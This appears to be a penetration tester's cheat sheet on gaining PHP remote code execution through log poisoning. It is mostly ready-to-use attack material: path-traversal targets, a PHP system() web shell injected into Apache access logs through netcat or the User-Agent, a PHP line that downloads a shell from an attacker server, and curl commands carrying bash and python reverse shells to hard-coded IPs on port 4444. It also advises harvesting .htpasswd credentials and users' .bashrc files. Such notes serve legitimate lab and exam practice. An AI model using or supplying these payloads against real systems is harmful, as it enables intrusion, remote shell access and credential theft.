For PHP RCE, you'll want to use a technique called `log poisoning`.

##### Required
Access to files
A log file (Usually `/var/log/apache2/access.log`), see #

#### Linux
##### Important
First, run 
```
../../../proc/self/environ
```
to get general information.
If RCE doesn't work, try RFI (other vhosts on machine)
If there is HTTP-BASIC-AUTH involved, check the `.htpasswd` file, it often contains credentials. (usually `/etc/apache2/.htpasswd`)
##### Target files: 
```
/var/log/apache2/access.log
Payload:
	bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F4444%200%3E%261%22 
```

#### Windows
##### Target files: 
```
C:\xampp\apache\logs\access.log
Payload:
	https://www.revshells.com/ (Powershell base64 - URL encoded)
```

#### General
Payload: 
```
<?php system($_GET['test']);?>

// Get PHP shell (named shell.php) from python3 server (saves as shell.php)
<?php file_put_contents('shell.php', file_get_contents('http://IP:PORT/shell.php'))?>
```

First, you need to get the payload in the log system:

```
nc IP PORT
GET /'<?php system($_GET['rce']); ?>'
test=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.241%2F4444%200%3E%261%22 
```

If this does not work, set your User-Agent as the payload.

To use the payload, send a request to the log file with the command in your payload:
```
// Template
curl http://IP/vulnerable.php?file=LOG_FILE_LOCATION&CMD=PAYLOAD

// Examples
curl http://IP/vulnerable.php?file=LOG_FILE_LOCATION&CMD=sh -i >& /dev/tcp/10.8.1.167/4444 0>&1
curl http://IP/vulnerable.php?file=LOG_FILE_LOCATION&CMD=export RHOST="10.8.1.167";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

### Note
Importanot note:
If you can read `/etc/passwd`, go through every user's home directory for the `.bashrc`


##### Mongo
Target file: `/var/www/dev/index.js`